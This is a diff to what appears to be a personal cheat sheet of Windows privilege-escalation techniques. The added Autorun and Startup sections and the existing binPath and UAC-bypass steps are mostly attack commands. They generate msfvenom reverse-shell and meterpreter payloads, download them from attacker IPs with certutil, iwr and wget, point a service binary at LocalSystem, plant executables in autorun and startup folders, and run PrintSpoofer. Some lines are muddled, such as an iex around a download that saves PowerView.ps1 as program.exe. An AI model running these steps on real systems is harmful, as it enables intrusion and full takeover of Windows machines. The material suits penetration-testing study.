@@ -59,7 +59,7 @@ nc -nvlp <port>
 
 -> Exploitation - windows
 ```
-iwr -uri <ip>/<service_eecutable_name> -Outfile  <service_eecutable_name>
+iwr -uri <ip>/<service_eecutable_name> -Outfile <service_executable_name>
 move <name_inside_the_path>.exe <service_path>  
 ```
 ```
@@ -71,7 +71,7 @@ or
 shutdown /r
 ```
 
-## binPath - Services
+## binPath - Services [PrivEsc]
 -> Detection
 ```
 . .\PowerUp.ps1
@@ -90,7 +90,7 @@ accesschk.exe -wuvc <service_name>
 sc qc <service_name>
 ```
 
--> Exploitation - windows
+-> Exploitation - Windows [PrivEsc]
 ```
 certutil -urlcache -f http://10.9.1.137:803/ok.exe ok.exe  
 sc config <name_ service> binPath="C:\Users\files\ok.exe" obj= LocalSystem  
@@ -108,18 +108,55 @@ PrintSpoofer64.exe -i -c cmd
 ```
 https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 
+### Autorun
+-> Detection - windows
+```
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu ""C:\Program Files\Autorun Program"  
+\\FILE_ALL_ACCESS
+```
+-> Exploitation - kali
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o program.exe
+```
+```
+iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile program.exe)
+move program.exe "C:\Program Files\Autorun Program"
+logoff
+```
+
+### Startup Applications
+-> Detection - Windows
+```
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | findstr (F) 
+\\BUILTIN\Users:(F)
+```
+
+-> msfvenom - Attacker VM
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o ok.exe
+```
+
+-> Exploitation - Windows
+```
+iex (iwr http://<file_server_IP>/PowerView.ps1 -Outfile ok.exe)
+move ok.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
+logoff
+```
+
 ## Bypass UAC
 ### EventViewer
 -> Step 1 - Kali
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f exe > ok.exe
 ```
+
 -> Step 2 - Win Owned  
 ```
 cd C:\Windows\tasks
 iwr -uri 192.168.119.139:805/shell.exe -Outfile shell.exe
 Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
 ```
+
 -> Step 3 - Win Owned  
 ```
 iwr -uri 192.168.119.139:805/powerup.ps1 -Outfile powerup.ps1
@@ -133,6 +170,7 @@ Invoke-AllChecks
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.139 LPORT=8445 -f exe > ok.exe
 ```
+
 -> Step 5 - Win Owned
 ```
 wget 192.168.119.139:805/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1
